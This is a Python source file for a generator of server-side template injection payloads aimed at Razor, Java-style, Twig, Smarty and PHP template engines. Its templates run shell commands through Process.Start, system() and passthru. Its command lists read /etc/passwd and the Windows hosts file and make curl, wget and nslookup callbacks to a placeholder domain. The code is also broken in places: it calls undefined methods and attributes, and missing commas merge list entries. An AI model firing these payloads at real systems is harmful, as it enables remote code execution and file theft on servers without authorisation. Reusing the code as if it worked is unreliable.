import urllib.parse


class TemplateInjectionGenerator():
    def __init__(self):
        super().__init__()

        self.number = 1337
        self.multiply_string = 7

        self.polyglot ="${{<%[%\\'"+'"}}%\\.'
        
        self.windows_commands = [
            'echo UNIQUE',
            'timeout /T TIMEOUT',
            'type C:\\Windows\\System32\\drivers\\etc\\hosts',
            'wget http://DOMAIN/UNIQUE',
            'curl http://DOMAIN/UNIQUE',
            'nslookup DOMAIN'
        ]

        self.linux_commands = [
            'echo UNIQ',
            'sleep TIMEOUT',
            'curl http://DOMAIN/UNIQUE',
            'wget http://DOMAIN/UNIQUE',
            'nslookup DOMAIN',
            'cat /etc/passwd',
        ]

        self.commands = [
            ('windows','reflection','echo UNIQUE'),
            ('windows','timeout','timeout /T TIMEOUT'),
            ('windows','reflection','type C:\\Windows\\System32\\drivers\\etc\\hosts'),
            ('windows','oast','wget http://DOMAIN/UNIQUE'),
            ('windows','oast','curl http://DOMAIN/UNIQUE'),
            ('windows','oast','nslookup DOMAIN'),
            ('linux','reflection','echo UNIQUE'),
            ('linux','timeout','sleep TIMEOUT'),
            ('linux','reflection','cat /etc/passwd'),
            ('linux','oast','curl http://DOMAIN/UNIQUE'),
            ('linux','oast','wget http://DOMAIN/UNIQUE'),
            ('linux','oast','nslookup DOMAIN'),

        ]
        self.unique_string = ""
        self.domain = "127.0.0.1"
        self.sleep_timeout = 15
        self.platforms = ['linux', 'windows']
        
        self.evidence_strings = [
            str(self.number*self.number),
            str(self.multiply_string*self.unique_string),
            str(self.number)+str(self.number),
            "Copyright (c) 1993-2009 Microsoft Corp.",
            "This is a sample HOSTS file used by Microsoft TCP/IP for Windows",
            "root:x:0:0:root:/root"
        ]        
        

    def generate_payloads(self):
        result = []

        # Add the polyglot first
        result.append(self.polyglot)
        
        razor_payloads = self.generate_razor_payloads()
        result += razor_payloads

        java_payloads = self.generate_java_payloads()
        result += java_payloads

        url_encoded = self.url_encode(result)
        result += url_encoded

        for r in result: print(r)
        input()
        return result

    def generate_from_templates(self, templates, windows_payloads=True, linux_payloads=True):

        result = []
        
        a = [
            ("NUM",self.num),
            ("MULTIP", self.num2)
        ]

        # Create payloads
        changed =  [self.change_variables(t,additional=a) for t in templates]

        # Change payloads in templates
        for c in changed:
            if "PAYLOAD" in c:
                if windows_payloads:
                    for p in self.windows_commands:
                        result.append(c.replace("PAYLOAD",self.change_variables(p)))
                if linux_payloads:
                    for p in self.linux_commands:
                        result.append(c.replace("PAYLOAD",self.change_variables(p)))
            else:
                result.append(c)

        return result 

    def generate_razor_templates(self):
        templates = [
            "@(NUM*NUM)", "@(\"NUM\"+\"NUM\")",
            '@(MULTIP*"UNIQUE")',
            "@{Response.Write(\"UNIQUE\");}", "@{@:UNIQUE}",
            "@{@Html.Raw(\"UNIQUE\")}", "@{Console.WriteLine(\"UNIQUE\");}"
            "@{ System.Diagnostics.Process.Start(\"cmd.exe\", \"/c PAYLOAD\"); }"
        ]

        return templates

    def generate_java_templates(self):
        basic_payloads = ['NUM*NUM','MULTIP*\"UNIQUE\"','\"NUM\"+\"NUM\"']



        templates = [
            "#{INJ}",
            "${INJ}",
            "[=INJ]",
            "{{INJ}}",
            "*{INJ}",
            "[[ INJ ]]",
            "[INJ]",
            "{INJ}",
            "{{=INJ}}",
            "<%INJ%>",
            "<%=INJ%>"
            "#{INJ}",
            "{php}PAYLOAD;{/php}",
            "{system('PAYLOAD')}",
            "{{['PAYLOAD']|map('passthru')}}",
            "{{['PAYLOAD']|filter('passthru')}}",
            "{{['PAYLOAD']|filter('system')}}",
            "{php system('PAYLOAD')}"
        ]


        payloads = [t.replace("INJ", p) for t in templates for p in basic_payloads]

        return payloads

    def generate_reflective_payloads(self):
        result = []
        # Add the polyglot first
        result.append(self.polyglot)

        templates = []
        templates.extend(self.change_templates(self.generate_razor_templates()))
        templates.extend(self.generate_java_templates())
        
        # Selecting payloads
        payload_list = [c[2] for c in self.commands if c[0] in self.platforms and c[1] == 'reflection']
        changed = self.change_templates(payload_list)


        result.extend([ t.replace("PAYLOAD", p) for t in templates for p in changed])
        return result



    def change_templates(self, payloads):
        return [p.replace("UNIQUE",self.unique_string).replace("TIMEOUT", str(self.sleep_timeout)).replace("DOMAIN", self.domain).replace("NUM",str(self.number)).replace("MULTIP", str(self.multiply_string)) for p in payloads]
